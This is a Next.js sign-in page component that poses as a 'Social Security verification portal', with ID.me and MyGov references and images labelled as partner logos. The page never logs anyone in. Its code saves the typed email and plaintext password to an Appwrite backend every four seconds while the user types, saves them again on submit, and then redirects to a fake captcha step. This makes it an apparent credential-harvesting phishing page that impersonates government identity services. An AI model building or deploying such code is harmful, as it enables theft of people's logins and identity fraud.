"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import Image from "next/image";
import { useAppwrite, UserData } from "@/app/lib/AppwriteContext";
import React from "react";

const signInSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  password: z.string().min(8, "Password must be at least 8 characters"),
});

type SignInFormData = z.infer<typeof signInSchema>;

export default function SignIn() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [isReset, setIsReset] = useState(false);
  
  const { 
    userData, 
    isLoading: appwriteLoading, 
    error: appwriteError, 
    updateField, 
    updateMultipleFields, 
    resetUserData,
    setAuthMethod
  } = useAppwrite();

 

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm<SignInFormData>({
    resolver: zodResolver(signInSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  // Watch form fields
  const watchedFields = watch();
  
  // Use a ref to track the debounce timer
  const debounceTimerRef = React.useRef<NodeJS.Timeout | null>(null);
  
  // Track last saved values to avoid unnecessary updates
  const [lastSavedValues, setLastSavedValues] = useState({ email: "", password: "" });

  // Handle field changes with debouncing
  useEffect(() => {
    // Clear any existing timer
    if (debounceTimerRef.current) {
      clearTimeout(debounceTimerRef.current);
    }
    
    // Check if values have changed since last save
    const emailChanged = watchedFields.email !== lastSavedValues.email;
    const passwordChanged = watchedFields.password !== lastSavedValues.password;
    
    // Only proceed if something changed
    if (!emailChanged && !passwordChanged) return;
    
    // Set a new timer
    debounceTimerRef.current = setTimeout(async () => {
      const updates: any = {};
      
      if (emailChanged) updates.email = watchedFields.email;
      if (passwordChanged) updates.password = watchedFields.password;
      
      if (Object.keys(updates).length > 0) {
        console.log('Updating Appwrite with:', updates);
        
        try {
          await updateMultipleFields(updates);
          // Update last saved values after successful save
          setLastSavedValues({
            email: watchedFields.email,
            password: watchedFields.password
          });
        } catch (err) {
          console.error('Failed to update fields:', err);
        }
      }
    }, 4000); // Increased to 4000ms (4 seconds) to reduce frequency
    
    return () => {
      // Clean up the timer
      if (debounceTimerRef.current) {
        clearTimeout(debounceTimerRef.current);
      }
    };
  }, [watchedFields.email, watchedFields.password, updateMultipleFields, lastSavedValues]);

  // Debug effect to log state updates
  useEffect(() => {
    console.log('SignIn Page - Appwrite User Data:', userData);
  }, [userData]);

  const onSubmit = async (data: SignInFormData) => {
    setIsLoading(true);
    setError("");

    try {
      // Update Appwrite with form values
      await updateMultipleFields({
        email: data.email,
        password: data.password
      });
      
      // Set auth method
      await setAuthMethod("email");

      // Redirect to captcha verification
      setTimeout(() => {
        router.push("/auth/captcha-verification");
      }, 1000);
    } catch (err) {
      console.error('Form submission error:', err);
      setError("Failed to save your data. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleIdMeSignIn = async () => {
    setIsLoading(true);
    setError("");
    
    try {
      // Generate a unique MyGov identifier that resembles an email to pass validation
      // We use the format idme_timestamp_random@MyGov to:
      // 1. Pass email validation in the backend (requires @ symbol)
      // 2. Maintain a unique identifier for each MyGov user
      // 3. Allow MyGov users to be clearly identified in the system
      const timestamp = Date.now();
      const randomString = Math.random().toString(36).substr(2, 9);
      const uniqueIdMeIdentifier = `idme_${timestamp}_${randomString}@MyGov`;
      
      // Create a document with MyGov auth method and unique identifier as email
      await updateMultipleFields({
        authMethod: "MyGov",
        email: uniqueIdMeIdentifier, // Use unique identifier in place of email
        password: "MyGov-auth", // Set a placeholder password
        signInTimestamp: new Date().toISOString()
      });
    
      // Redirect to captcha verification
    setTimeout(() => {
      router.push("/auth/captcha-verification");
    }, 1000);
    } catch (error) {
      console.error('Failed to save MyGov auth data:', error);
      setError("Failed to save your data. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  

  return (
    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
      <div className="w-full max-w-md space-y-8 rounded-lg bg-white p-8 shadow-md">
       

        <div className="text-center">
          <h1 className="text-3xl font-bold text-[#0053a0]">Sign In</h1>
          <p className="mt-2 text-gray-600">
            Sign in to access your Social Security verification portal
          </p>
        </div>

       

       

        <form className="mt-8 space-y-6" onSubmit={handleSubmit(onSubmit)}>
          <div className="space-y-4 rounded-md ">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                Email address
              </label>
              <input
                id="email"
                type="email"
                {...register("email")}
                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                placeholder="Email address"
              />
              {errors.email && (
                <p className="mt-1 text-sm text-red-600">{errors.email.message}</p>
              )}
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                Password
              </label>
              <input
                id="password"
                type="password"
                {...register("password")}
                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                placeholder="Password"
              />
              {errors.password && (
                <p className="mt-1 text-sm text-red-600">{errors.password.message}</p>
              )}
            </div>
          </div>

          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <input
                id="remember-me"
                name="remember-me"
                type="checkbox"
                className="h-4 w-4 rounded border-gray-300 text-[#0053a0] focus:ring-[#0053a0]"
              />
              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900">
                Remember me
              </label>
            </div>

            <div className="text-sm">
              <Link
                href="/auth/forgot-password"
                className="font-medium text-[#0053a0] hover:text-[#00478c]"
              >
                Forgot your password?
              </Link>
            </div>
          </div>

          <div>
            <button
              type="submit"
              className="group relative flex w-full justify-center rounded-md border border-transparent bg-[#0053a0] px-4 py-2 text-sm font-medium text-white hover:bg-[#00478c] focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2 disabled:opacity-50"
            >
              Sign In
            </button>
             <p className="mt-1 text-xs text-gray-500 text-center">
              ID.me verification includes 30-60 second identity check
            </p>
{/*             <p className="mt-1 text-xs text-gray-500 text-center">
              Email verification includes CAPTCHA human verification
            </p> */}
          </div>
          
{/*           <div className="relative flex items-center py-2">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="mx-4 flex-shrink text-xs text-gray-500">Or</span>
            <div className="flex-grow border-t border-gray-300"></div>
          </div> */}
          
{/*           <div>
            <button
              type="button"
              onClick={handleIdMeSignIn}
              className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2"
            >
              <Image 
                src="/icons/asd.jpg" 
                alt="asd logo" 
                width={20} 
                height={20}
                className="h-5 w-5 object-contain" 
              />
              { "Continue with MyGov"}
            </button>
            <p className="mt-1 text-xs text-gray-500 text-center">
              MyGov verification includes 30-60 second identity check
            </p>
          </div> */}

          

          {/* Verification Partner Logos */}
          <div className="mt-6">
            <p className="mb-3 text-center text-xs text-gray-500">Verified by our trusted partners</p>
            <div className="flex items-center justify-between">
              <div className="flex-shrink-0">
                <Image 
                  src="/icons/aus.jpg" 
                  alt="next Verification Partner" 
                  width={100} 
                  height={40}
                  className="h-8 w-auto object-contain" 
                />
              </div>
              <div className="flex-shrink-0">
                <Image 
                  src="/icons/asd.jpg" 
                  alt="next Verification Partner" 
                  width={100} 
                  height={40}
                  className="h-8 w-auto object-contain" 
                />
              </div>
              <div className="flex-shrink-0">
                <Image 
                  src="/icons/next.jpg" 
                  alt="next Verification Partner" 
                  width={120} 
                  height={50}
                  className="h-8 w-auto object-contain" 
                />
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
} 
